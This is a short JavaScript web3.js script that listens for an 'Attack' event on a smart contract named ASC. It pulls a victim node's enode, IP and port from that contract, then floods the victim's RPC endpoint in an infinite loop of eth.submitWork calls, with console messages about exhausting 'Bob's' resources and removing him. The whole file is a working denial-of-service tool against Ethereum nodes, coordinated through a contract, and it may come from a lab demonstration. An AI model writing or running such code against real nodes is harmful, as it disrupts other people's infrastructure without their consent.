var Web3 = require('web3');
const web3 = new Web3(new Web3.providers.HttpProvider("http://localhost:8546"));


var Address = '0x67a7e88a8cb14dc5f28f8297737b83e69d91e687';
var abi = JSON.parse( '{ "contractName": "ASC", "abi": [ { "constant": false, "inputs": [], "name": "register", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [ { "name": "_victimEnode", "type": "string" }, { "name": "_victimIP", "type": "string" }, { "name": "_victimPort", "type": "string" } ], "name": "set", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [ { "indexed": false, "name": "msg", "type": "string" } ], "name": "Attack", "type": "event" }, { "constant": true, "inputs": [], "name": "get", "outputs": [ { "name": "", "type": "string" }, { "name": "", "type": "string" }, { "name": "", "type": "string" } ], "payable": false, "stateMutability": "view", "type": "function" } ] }');


var cont = web3.eth.contract(abi.abi).at(Address);

//web3.eth.getAccounts(console.log);

var trigger = cont.Attack();

trigger.watch(function(err, result) {
  if (!err) {
    var info = cont.get();
    console.log('Obtaining Bobs Information\n');
    attackVictim(info[0], info[1], info[2]);
  }
});


function attackVictim(enode, ip, port) {
  //change web3 provider to bob
  //issue web3 commands
  console.log("Attacking Bob\n");
  try{
    var address = "http://" + ip + ":" + port;
    const bob_web3 = new Web3(new Web3.providers.HttpProvider(address));
    while (bob_web3.currentProvider) {
      console.log("Exhausting Bob's Resources");

        bob_web3.eth.submitWork(
          "0x0000000000000001",
          "0x8f9bf5c655aa112c3b358963999d12aeaf49a5f1c2455eaac98bb9863f138cb3",
          "0xD1FE5700000000000000000000000000D1FE5700000000000000000000000000"
        );
    }
  }catch(err){
      console.log("BOB HAS BEEN REMOVED");
  }
}
